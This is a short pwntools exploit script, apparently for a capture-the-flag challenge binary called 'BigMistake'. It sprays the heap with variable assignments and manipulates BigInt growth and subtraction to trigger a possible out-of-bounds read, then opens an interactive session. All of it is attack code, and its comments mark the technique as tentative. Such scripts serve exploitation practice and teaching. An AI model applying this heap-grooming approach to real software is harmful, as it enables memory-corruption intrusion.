from pwn import *

p = process("./BigMistake")

def cmd(x):
    p.sendlineafter(b"> ", x.encode())

# 1. heap spray (force deterministic layout)
for i in range(20):
    cmd(f"a{i} = 1")

# 2. create tightly packed BigInts
cmd("a = 1")
cmd("b = 1")
cmd("c = 1")

# 3. force repeated small growth (NO big realloc)
cmd("a = a + b")
cmd("a = a + b")
cmd("a = a + b")

# 4. trigger potential OOB window
cmd("a = a - b - b - b - b - b")

# 5. reuse / read corruption
cmd("c")

p.interactive()
